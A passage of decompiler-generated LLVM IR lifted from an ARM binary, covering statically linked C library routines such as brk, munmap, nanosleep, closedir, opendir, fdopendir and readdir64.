  br i1 %v2_18f60, label %dec_label_pc_18f6c, label %dec_label_pc_18f7c

dec_label_pc_18f6c:                               ; preds = %entry
  %v1_18f70 = call i32 @__GI_brk(i32 0)
  %v1_18f74 = icmp slt i32 %v1_18f70, 0
  br i1 %v1_18f74, label %dec_label_pc_18fa0, label %dec_label_pc_18f7cthread-pre-split

dec_label_pc_18f7cthread-pre-split:               ; preds = %dec_label_pc_18f6c
  %v0_18f80.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_18f7c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_18f7c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18f7c

dec_label_pc_18f7c:                               ; preds = %dec_label_pc_18f7cthread-pre-split, %entry
  %v1_18f7c = phi i32 [ %v1_18f7c.pre, %dec_label_pc_18f7cthread-pre-split ], [ 26356, %entry ]
  %v0_18f7c = phi i32 [ %v0_18f7c.pre, %dec_label_pc_18f7cthread-pre-split ], [ ptrtoint (i32* @global_var_2e024.1314 to i32), %entry ]
  %v1_18f90 = phi i32 [ %v0_18f80.pr, %dec_label_pc_18f7cthread-pre-split ], [ %arg1, %entry ]
  %v2_18f7c = add i32 %v0_18f7c, %v1_18f7c
  %v3_18f7c = inttoptr i32 %v2_18f7c to i32*
  %v4_18f7c = load i32, i32* %v3_18f7c, align 4
  %v2_18f80 = icmp eq i32 %v1_18f90, 0
  store i32 %v4_18f7c, i32* %r4.global-to-local, align 4
  br i1 %v2_18f80, label %dec_label_pc_18fa4, label %dec_label_pc_18f8c

dec_label_pc_18f8c:                               ; preds = %dec_label_pc_18f7c
  %v2_18f90 = add i32 %v4_18f7c, %v1_18f90
  %v1_18f94 = call i32 @__GI_brk(i32 %v2_18f90)
  %v1_18f98 = icmp slt i32 %v1_18f94, 0
  br i1 %v1_18f98, label %dec_label_pc_18fa0, label %dec_label_pc_18f8c.dec_label_pc_18fa4_crit_edge

dec_label_pc_18f8c.dec_label_pc_18fa4_crit_edge:  ; preds = %dec_label_pc_18f8c
  %v0_18fa4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18fa4

dec_label_pc_18fa0:                               ; preds = %dec_label_pc_18f8c, %dec_label_pc_18f6c
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18fa4

dec_label_pc_18fa4:                               ; preds = %dec_label_pc_18f7c, %dec_label_pc_18f8c.dec_label_pc_18fa4_crit_edge, %dec_label_pc_18fa0
  %v0_18fa4 = phi i32 [ %v0_18fa4.pre, %dec_label_pc_18f8c.dec_label_pc_18fa4_crit_edge ], [ -1, %dec_label_pc_18fa0 ], [ %v4_18f7c, %dec_label_pc_18f7c ]
  %v2_18fa8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18fa8, i32* @r4, align 4
  ret i32 %v0_18fa4

; uselistorder directives
  uselistorder i32 %v4_18f7c, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_18fa4, { 2, 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_18fc8 = load i32, i32* @r0, align 4
  ret i32 %v1_18fc8
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18fcc = load i32, i32* @r7, align 4
  store i32 %v3_18fcc, i32* %stack_var_-8, align 4
  %v0_18fd8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18fd8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_18fd8, -4095
  br i1 %tmp, label %dec_label_pc_18ff8, label %dec_label_pc_18fe8

dec_label_pc_18fe8:                               ; preds = %entry
  %v0_18fe8 = call i32 @__GI___errno_location()
  %v0_18fec = load i32, i32* %r7.global-to-local, align 4
  %v1_18fec = sub i32 0, %v0_18fec
  %v2_18ff0 = inttoptr i32 %v0_18fe8 to i32*
  store i32 %v1_18fec, i32* %v2_18ff0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_18ff8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_18ff8

dec_label_pc_18ff8:                               ; preds = %entry, %dec_label_pc_18fe8
  %v1_18ffc = phi i32 [ %v0_18fd8, %entry ], [ -1, %dec_label_pc_18fe8 ]
  %v2_18ff8 = phi i32 [ %v3_18fcc, %entry ], [ %v2_18ff8.pre, %dec_label_pc_18fe8 ]
  store i32 %v2_18ff8, i32* @r7, align 4
  ret i32 %v1_18ffc

; uselistorder directives
  uselistorder i32 %v0_18fd8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18ff8, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19000 = load i32, i32* @r7, align 4
  store i32 %v3_19000, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_19028, label %dec_label_pc_19018

dec_label_pc_19018:                               ; preds = %entry
  %v0_19018 = call i32 @__GI___errno_location()
  %v0_1901c = load i32, i32* %r7.global-to-local, align 4
  %v1_1901c = sub i32 0, %v0_1901c
  %v2_19020 = inttoptr i32 %v0_19018 to i32*
  store i32 %v1_1901c, i32* %v2_19020, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1902c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_19028

dec_label_pc_19028:                               ; preds = %entry, %dec_label_pc_19018
  %v2_1902c = phi i32 [ %v3_19000, %entry ], [ %v2_1902c.pre, %dec_label_pc_19018 ]
  %v0_19028 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_19018 ]
  store i32 %v2_1902c, i32* @r7, align 4
  ret i32 %v0_19028

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19028, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19034 = load i32, i32* @r7, align 4
  store i32 %v3_19034, i32* %stack_var_-8, align 4
  %v0_19040 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_19040, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_19040, -4095
  br i1 %tmp, label %dec_label_pc_19060, label %dec_label_pc_19050

dec_label_pc_19050:                               ; preds = %entry
  %v0_19050 = call i32 @__GI___errno_location()
  %v0_19054 = load i32, i32* %r7.global-to-local, align 4
  %v1_19054 = sub i32 0, %v0_19054
  %v2_19058 = inttoptr i32 %v0_19050 to i32*
  store i32 %v1_19054, i32* %v2_19058, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_19060.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_19060

dec_label_pc_19060:                               ; preds = %entry, %dec_label_pc_19050
  %v1_19064 = phi i32 [ %v0_19040, %entry ], [ -1, %dec_label_pc_19050 ]
  %v2_19060 = phi i32 [ %v3_19034, %entry ], [ %v2_19060.pre, %dec_label_pc_19050 ]
  store i32 %v2_19060, i32* @r7, align 4
  ret i32 %v1_19064

; uselistorder directives
  uselistorder i32 %v0_19040, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19060, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_19068 = load i32, i32* @r4, align 4
  store i32 %v3_19068, i32* %stack_var_-24, align 4
  %v2_1906c = load i32, i32* %arg1, align 4
  store i32 %v2_1906c, i32* %r4.global-to-local, align 4
  %v3_19074 = icmp eq i32 %v2_1906c, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r6, align 4
  br i1 %v3_19074, label %dec_label_pc_19088, label %dec_label_pc_1909c

dec_label_pc_19088:                               ; preds = %entry
  %v0_19088 = call i32 @__GI___errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v0_19090 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_19090, i32* %r2.global-to-local, align 4
  %v2_19094 = inttoptr i32 %v0_19088 to i32*
  store i32 9, i32* %v2_19094, align 4
  %v0_1913c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1913c

dec_label_pc_1909c:                               ; preds = %entry
  store i32 40, i32* %r3.global-to-local, align 4
  %v1_190a0 = add i32 %tmp, 24
  store i32 %v1_190a0, i32* %r4.global-to-local, align 4
  store i32 %v1_190a0, i32* %r2.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v4_190b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_190b4)
  store i32 -1, i32* @r8, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_190cc = load i32, i32* @r6, align 4
  %v2_190cc = add i32 %v0_190cc, 20
  %v3_190cc = inttoptr i32 %v2_190cc to i32*
  %v4_190cc = load i32, i32* %v3_190cc, align 4
  call void @__pseudo_branch(i32 %v4_190cc)
  %v0_190d8 = load i32, i32* @r7, align 4
  %v1_190d8 = inttoptr i32 %v0_190d8 to i32*
  %v2_190d8 = load i32, i32* %v1_190d8, align 4
  store i32 %v2_190d8, i32* @r4, align 4
  store i32 28, i32* %r3.global-to-local, align 4
  %v0_190e8 = load i32, i32* @r8, align 4
  store i32 %v0_190e8, i32* %v1_190d8, align 4
  %v0_190ec = load i32, i32* @r6, align 4
  %v1_190ec = load i32, i32* %r3.global-to-local, align 4
  %v2_190ec = add i32 %v1_190ec, %v0_190ec
  %v3_190ec = inttoptr i32 %v2_190ec to i32*
  %v4_190ec = load i32, i32* %v3_190ec, align 4
  store i32 ptrtoint (i32* @global_var_190f8.1544 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_190ec)
  %v0_190f8 = load i32, i32* @r7, align 4
  %v1_190f8 = add i32 %v0_190f8, 12
  %v2_190f8 = inttoptr i32 %v1_190f8 to i32*
  %v3_190f8 = load i32, i32* %v2_190f8, align 4
  store i32 %v3_190f8, i32* @r0, align 4
  %v0_190fc = call i32 @free()
  %v0_19100 = load i32, i32* @r7, align 4
  store i32 %v0_19100, i32* @r0, align 4
  %v0_19104 = call i32 @free()
  %v0_1910c = load i32, i32* @r4, align 4
  %tmp11 = icmp ult i32 %v0_1910c, -4095
  br i1 %tmp11, label %dec_label_pc_19138, label %dec_label_pc_19128

dec_label_pc_19128:                               ; preds = %dec_label_pc_1909c
  %v0_19128 = call i32 @__GI___errno_location()
  %v0_1912c = load i32, i32* @r4, align 4
  %v1_1912c = sub i32 0, %v0_1912c
  store i32 %v1_1912c, i32* %r3.global-to-local, align 4
  %v2_19130 = inttoptr i32 %v0_19128 to i32*
  store i32 %v1_1912c, i32* %v2_19130, align 4
  %v0_19134 = load i32, i32* @r8, align 4
  br label %dec_label_pc_19138

dec_label_pc_19138:                               ; preds = %dec_label_pc_1909c, %dec_label_pc_19128
  %v0_19138 = phi i32 [ %v0_1910c, %dec_label_pc_1909c ], [ %v0_19134, %dec_label_pc_19128 ]
  store i32 %v0_19138, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1913c

dec_label_pc_1913c:                               ; preds = %dec_label_pc_19088, %dec_label_pc_19138
  %v0_1913c = phi i32 [ %v0_1913c.pre, %dec_label_pc_19088 ], [ %v0_19138, %dec_label_pc_19138 ]
  %v2_19144 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_19144, i32* %r4.global-to-local, align 4
  ret i32 %v0_1913c

; uselistorder directives
  uselistorder i32 %v0_1910c, { 1, 0 }
  uselistorder label %dec_label_pc_1913c, { 1, 0 }
  uselistorder label %dec_label_pc_19138, { 1, 0 }
}

define i32 @function_19150(i32 %arg1) local_unnamed_addr {
dec_label_pc_19150:
  %v0_19150 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19150, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_19150
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_19150, %bb
  %v10_1915c = phi i32 [ %arg1, %dec_label_pc_19150 ], [ 0, %bb ]
  ret i32 %v10_1915c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v12_19160 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_19174 = call i32 @malloc(i32 48)
  %v2_1917c = icmp eq i32 %v1_19174, 0
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r6, align 4
  br i1 %v2_1917c, label %bb, label %dec_label_pc_1918c

bb:                                               ; preds = %entry
  br label %dec_label_pc_19218

dec_label_pc_1918c:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19190 = load i32, i32* @r4, align 4
  %v2_19190 = icmp ugt i32 %v0_19190, 511
  %v2_19194 = add i32 %v1_19174, 4
  %v3_19194 = inttoptr i32 %v2_19194 to i32*
  store i32 0, i32* %v3_19194, align 4
  %v0_19198 = load i32, i32* %r3.global-to-local, align 4
  %v2_19198 = add i32 %v1_19174, 16
  %v3_19198 = inttoptr i32 %v2_19198 to i32*
  store i32 %v0_19198, i32* %v3_19198, align 4
  %v0_1919c = load i32, i32* %r3.global-to-local, align 4
  %v2_1919c = add i32 %v1_19174, 8
  %v3_1919c = inttoptr i32 %v2_1919c to i32*
  store i32 %v0_1919c, i32* %v3_1919c, align 4
  br i1 %v2_19190, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_1918c
  %v0_191a42 = load i32, i32* @r4, align 4
  %v2_191a43 = add i32 %v1_19174, 20
  %v3_191a44 = inttoptr i32 %v2_191a43 to i32*
  store i32 %v0_191a42, i32* %v3_191a44, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_1918c
  %v1_191a0 = load i32, i32* %r3.global-to-local, align 4
  %v2_191a0 = add i32 %v1_191a0, 512
  store i32 %v2_191a0, i32* %r3.global-to-local, align 4
  %v0_191a4 = load i32, i32* @r4, align 4
  %v2_191a4 = add i32 %v1_19174, 20
  %v3_191a4 = inttoptr i32 %v2_191a4 to i32*
  store i32 %v0_191a4, i32* %v3_191a4, align 4
  %v1_191a8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_191a8, i32* %v3_191a4, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v1_19174, i32* @r5, align 4
  %v0_191b0 = load i32, i32* @r7, align 4
  %v2_191b0 = inttoptr i32 %v1_19174 to i32*
  store i32 %v0_191b0, i32* %v2_191b0, align 4
  %v0_191b4 = load i32, i32* @r5, align 4
  %v1_191b4 = add i32 %v0_191b4, 20
  %v2_191b4 = inttoptr i32 %v1_191b4 to i32*
  %v3_191b4 = load i32, i32* %v2_191b4, align 4
  store i32 %v3_191b4, i32* %r1.global-to-local, align 4
  %v2_191bc = call i32 @calloc(i32 1, i32 %v3_191b4)
  %v2_191c0 = icmp eq i32 %v2_191bc, 0
  store i32 %v2_191bc, i32* @r4, align 4
  %v1_191c8 = load i32, i32* @r5, align 4
  %v2_191c8 = add i32 %v1_191c8, 12
  %v3_191c8 = inttoptr i32 %v2_191c8 to i32*
  store i32 %v2_191bc, i32* %v3_191c8, align 4
  br i1 %v2_191c0, label %dec_label_pc_191d0, label %dec_label_pc_191e0

dec_label_pc_191d0:                               ; preds = %bb17
  %v0_191d0 = load i32, i32* @r5, align 4
  store i32 %v0_191d0, i32* @r0, align 4
  %v0_191d4 = call i32 @free()
  %v0_191d8 = load i32, i32* @r4, align 4
  br label %dec_label_pc_19218

dec_label_pc_191e0:                               ; preds = %bb17
  %v0_191e4 = load i32, i32* @r6, align 4
  %v2_191e4 = add i32 %v0_191e4, -33504
  store i32 %v2_191e4, i32* %r3.global-to-local, align 4
  %v1_191ec = inttoptr i32 %v2_191e4 to i32*
  %v2_191ec = load i32, i32* %v1_191ec, align 4
  %v3_191ec = add i32 %v0_191e4, -33500
  %v4_191ec = inttoptr i32 %v3_191ec to i32*
  %v5_191ec = load i32, i32* %v4_191ec, align 4
  store i32 %v5_191ec, i32* %r1.global-to-local, align 4
  %v6_191ec = add i32 %v0_191e4, -33496
  %v7_191ec = inttoptr i32 %v6_191ec to i32*
  %v8_191ec = load i32, i32* %v7_191ec, align 4
  store i32 %v8_191ec, i32* %r2.global-to-local, align 4
  %v9_191ec = add i32 %v0_191e4, -33492
  %v10_191ec = inttoptr i32 %v9_191ec to i32*
  %v11_191ec = load i32, i32* %v10_191ec, align 4
  store i32 %v11_191ec, i32* %r3.global-to-local, align 4
  %v12_191ec = add i32 %v0_191e4, -33488
  %v1_191f8 = inttoptr i32 %v12_191ec to i32*
  %v2_191f8 = load i32, i32* %v1_191f8, align 4
  %v3_191f8 = add i32 %v0_191e4, -33484
  %v4_191f8 = inttoptr i32 %v3_191f8 to i32*
  %v5_191f8 = load i32, i32* %v4_191f8, align 4
  store i32 %v2_191f8, i32* %stack_var_-32, align 4
  store i32 %v5_191ec, i32* %r1.global-to-local, align 4
  store i32 %v8_191ec, i32* %r2.global-to-local, align 4
  store i32 %v11_191ec, i32* %r3.global-to-local, align 4
  %v0_19208 = load i32, i32* @r5, align 4
  %v1_19208 = add i32 %v0_19208, 24
  %v1_1920c = inttoptr i32 %v1_19208 to i32*
  store i32 %v2_191ec, i32* %v1_1920c, align 4
  %v3_1920c = add i32 %v0_19208, 28
  %v4_1920c = inttoptr i32 %v3_1920c to i32*
  %v5_1920c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1920c, i32* %v4_1920c, align 4
  %v6_1920c = add i32 %v0_19208, 32
  %v7_1920c = inttoptr i32 %v6_1920c to i32*
  %v8_1920c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1920c, i32* %v7_1920c, align 4
  %v9_1920c = add i32 %v0_19208, 36
  %v10_1920c = inttoptr i32 %v9_1920c to i32*
  %v11_1920c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_1920c, i32* %v10_1920c, align 4
  %v12_1920c = add i32 %v0_19208, 40
  %v2_19210 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_191f8, i32* %r1.global-to-local, align 4
  %v1_19214 = inttoptr i32 %v12_1920c to i32*
  store i32 %v2_19210, i32* %v1_19214, align 4
  %v3_19214 = add i32 %v0_19208, 44
  %v4_19214 = inttoptr i32 %v3_19214 to i32*
  %v5_19214 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_19214, i32* %v4_19214, align 4
  %v0_19218.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19218

dec_label_pc_19218:                               ; preds = %bb, %dec_label_pc_191d0, %dec_label_pc_191e0
  %v0_19218 = phi i32 [ 0, %bb ], [ %v0_191d8, %dec_label_pc_191d0 ], [ %v0_19218.pre, %dec_label_pc_191e0 ]
  store i32 %v12_19160, i32* @r7, align 4
  ret i32 %v0_19218

; uselistorder directives
  uselistorder i32 %v2_191bc, { 1, 0, 2 }
  uselistorder i32 %v1_19174, { 2, 1, 6, 0, 5, 4, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_19218, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_19238 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %arg1, i32* @r7, align 4
  %tmp7 = icmp ult i32 %arg1, -4095
  br i1 %tmp7, label %dec_label_pc_19260, label %dec_label_pc_19250

dec_label_pc_19250:                               ; preds = %entry
  %v0_19250 = call i32 @__GI___errno_location()
  %v0_19254 = load i32, i32* @r7, align 4
  %v1_19254 = sub i32 0, %v0_19254
  %v2_19258 = inttoptr i32 %v0_19250 to i32*
  store i32 %v1_19254, i32* %v2_19258, align 4
  br label %dec_label_pc_19284

dec_label_pc_19260:                               ; preds = %entry
  %v1_19260 = icmp slt i32 %arg1, 0
  br i1 %v1_19260, label %dec_label_pc_19284, label %dec_label_pc_19268

dec_label_pc_19268:                               ; preds = %dec_label_pc_19260
  store i32 %v2_19238, i32* @r1, align 4
  %v0_1926c = call i32 @fstat()
  %v1_19270 = icmp slt i32 %v0_1926c, 0
  br i1 %v1_19270, label %dec_label_pc_19278, label %dec_label_pc_1928c

dec_label_pc_19278:                               ; preds = %dec_label_pc_19268
  br label %dec_label_pc_19284

dec_label_pc_19284:                               ; preds = %dec_label_pc_19278, %dec_label_pc_19260, %dec_label_pc_19250
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_192c8

dec_label_pc_1928c:                               ; preds = %dec_label_pc_19268
  %v0_19294 = load i32, i32* @r7, align 4
  %v3_19298 = call i32 @__GI___fcntl_nocancel(i32 %v0_19294, i32 2, i32 1)
  %v0_1929c = load i32, i32* @r7, align 4
  %v2_192a4 = call i32 @fd_to_DIR(i32 %v0_1929c, i32 %tmp)
  store i32 %v2_192a4, i32* %r4.global-to-local, align 4
  %v2_192a8 = icmp eq i32 %v2_192a4, 0
  br i1 %v2_192a8, label %dec_label_pc_192b0, label %dec_label_pc_192c8

dec_label_pc_192b0:                               ; preds = %dec_label_pc_1928c
  %v0_192bc = call i32 @__GI___errno_location()
  %v2_192c4 = inttoptr i32 %v0_192bc to i32*
  store i32 12, i32* %v2_192c4, align 4
  %v0_192c8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_192c8

dec_label_pc_192c8:                               ; preds = %dec_label_pc_1928c, %dec_label_pc_19284, %dec_label_pc_192b0
  %v0_192c8 = phi i32 [ %v2_192a4, %dec_label_pc_1928c ], [ 0, %dec_label_pc_19284 ], [ %v0_192c8.pre, %dec_label_pc_192b0 ]
  ret i32 %v0_192c8

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_192c8, { 2, 0, 1 }
}

define i32 @fdopendir(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_192e0 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_192e0, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_192ec = call i32 @fstat()
  store i32 %v0_192ec, i32* @r5, align 4
  %v2_192f0 = icmp eq i32 %v0_192ec, 0
  br i1 %v2_192f0, label %dec_label_pc_192f8, label %dec_label_pc_19360

dec_label_pc_192f8:                               ; preds = %entry
  %v1_192fc = and i32 %tmp4, 61440
  store i32 %v1_192fc, i32* @r3, align 4
  %v7_19300 = icmp eq i32 %v1_192fc, 16384
  br i1 %v7_19300, label %dec_label_pc_19318, label %dec_label_pc_19308

dec_label_pc_19308:                               ; preds = %dec_label_pc_192f8
  %v0_19308 = call i32 @__GI___errno_location()
  br label %dec_label_pc_19344

dec_label_pc_19318:                               ; preds = %dec_label_pc_192f8
  %v0_19318 = load i32, i32* @r4, align 4
  %v2_19320 = call i32 @__libc_fcntl(i32 %v0_19318, i32 3)
  %v7_19324 = icmp eq i32 %v2_19320, -1
  br i1 %v7_19324, label %dec_label_pc_19360, label %dec_label_pc_1932c

dec_label_pc_1932c:                               ; preds = %dec_label_pc_19318
  %v1_1932c = urem i32 %v2_19320, 4
  %v7_19330 = icmp eq i32 %v1_1932c, 1
  br i1 %v7_19330, label %dec_label_pc_19338, label %dec_label_pc_1934c

dec_label_pc_19338:                               ; preds = %dec_label_pc_1932c
  %v0_19338 = call i32 @__GI___errno_location()
  br label %dec_label_pc_19344

dec_label_pc_19344:                               ; preds = %dec_label_pc_19308, %dec_label_pc_19338
  %storemerge2 = phi i32 [ %v0_19308, %dec_label_pc_19308 ], [ %v0_19338, %dec_label_pc_19338 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_19308 ], [ 22, %dec_label_pc_19338 ]
  %storemerge1 = load i32, i32* @r5, align 4
  store i32 %storemerge1, i32* %r2.global-to-local, align 4
  %v2_19344 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_19344, align 4
  %v0_19364.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19364

dec_label_pc_1934c:                               ; preds = %dec_label_pc_1932c
  %v0_1934c = load i32, i32* @r4, align 4
  %v2_19354 = call i32 @fd_to_DIR(i32 %v0_1934c, i32 %tmp)
  store i32 %v2_19354, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19364

dec_label_pc_19360:                               ; preds = %entry, %dec_label_pc_19318
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19364

dec_label_pc_19364:                               ; preds = %dec_label_pc_1934c, %dec_label_pc_19344, %dec_label_pc_19360
  %v0_19364 = phi i32 [ %v2_19354, %dec_label_pc_1934c ], [ %v0_19364.pre, %dec_label_pc_19344 ], [ 0, %dec_label_pc_19360 ]
  ret i32 %v0_19364

; uselistorder directives
  uselistorder i32 %v2_19320, { 1, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_19364, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19360, { 1, 0 }
  uselistorder label %dec_label_pc_19344, { 1, 0 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r6, align 4
  %v1_19388 = add i32 %tmp, 24
  store i32 %v1_19388, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_193a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 80) to i32*), align 4
  store i32 %v4_193a0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_193a0)
  %v0_193b4 = load i32, i32* @r6, align 4
  %v2_193b4 = add i32 %v0_193b4, 20
  %v3_193b4 = inttoptr i32 %v2_193b4 to i32*
  %v4_193b4 = load i32, i32* %v3_193b4, align 4
  store i32 %v4_193b4, i32* %ip.global-to-local, align 4
  store i32 103360, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_193b4)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_193c4

dec_label_pc_193c4:                               ; preds = %dec_label_pc_193f4, %entry
  %v0_193c4 = load i32, i32* @r5, align 4
  %v1_193c4 = add i32 %v0_193c4, 4
  %v2_193c4 = inttoptr i32 %v1_193c4 to i32*
  %v3_193c4 = load i32, i32* %v2_193c4, align 4
  %v4_193c4 = add i32 %v0_193c4, 8
  %v5_193c4 = inttoptr i32 %v4_193c4 to i32*
  %v6_193c4 = load i32, i32* %v5_193c4, align 4
  %tmp10 = icmp ugt i32 %v6_193c4, %v3_193c4
  br i1 %tmp10, label %dec_label_pc_193f4, label %dec_label_pc_193d0

dec_label_pc_193d0:                               ; preds = %dec_label_pc_193c4
  %v1_193d0 = inttoptr i32 %v0_193c4 to i32*
  %v2_193d0 = load i32, i32* %v1_193d0, align 4
  %v1_193d4 = add i32 %v0_193c4, 12
  %v2_193d4 = inttoptr i32 %v1_193d4 to i32*
  %v3_193d4 = load i32, i32* %v2_193d4, align 4
  %v1_193d8 = add i32 %v0_193c4, 20
  %v2_193d8 = inttoptr i32 %v1_193d8 to i32*
  %v3_193d8 = load i32, i32* %v2_193d8, align 4
  %v4_193dc = inttoptr i32 %v3_193d4 to i32*
  %v5_193dc = call i32 @__getdents64(i32 %v2_193d0, i32* %v4_193dc, i32 %v3_193d8, i32 %v6_193c4)
  %tmp9 = icmp slt i32 %v5_193dc, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_193ec

.thread:                                          ; preds = %dec_label_pc_193d0
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_19424

dec_label_pc_193ec:                               ; preds = %dec_label_pc_193d0
  %v1_193ec = load i32, i32* @r5, align 4
  %v2_193ec = add i32 %v1_193ec, 8
  %v3_193ec = inttoptr i32 %v2_193ec to i32*
  store i32 %v5_193dc, i32* %v3_193ec, align 4
  %v0_193f0 = load i32, i32* @r7, align 4
  %v1_193f0 = load i32, i32* @r5, align 4
